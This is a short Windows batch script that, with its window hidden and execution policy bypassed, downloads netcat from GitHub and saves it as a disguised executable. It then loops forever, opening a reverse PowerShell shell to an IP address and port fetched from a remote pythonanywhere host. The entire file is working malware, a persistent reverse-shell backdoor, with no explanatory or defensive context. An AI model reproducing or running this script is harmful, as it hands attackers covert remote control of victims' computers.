@echo off
powershell -WindowStyle Hidden -ExecutionPolicy Bypass "Invoke-WebRequest https://github.com/RAF-87/win-back-cat/blob/master/files/nc.exe?raw=true -OutFile C:\\Windows\\Tasks\\Premier.exe"
:x
powershell -c "C:\\Windows\\Tasks\\Premier.exe -e powershell.exe ([System.Net.Dns]::GetHostAddresses((Invoke-WebRequest -Uri http://404errornotfound.pythonanywhere.com).content.Split(':')[0]).IPAddressToString) ((Invoke-WebRequest -Uri http://404errornotfound.pythonanywhere.com).content.Split(':')[1])"
goto x
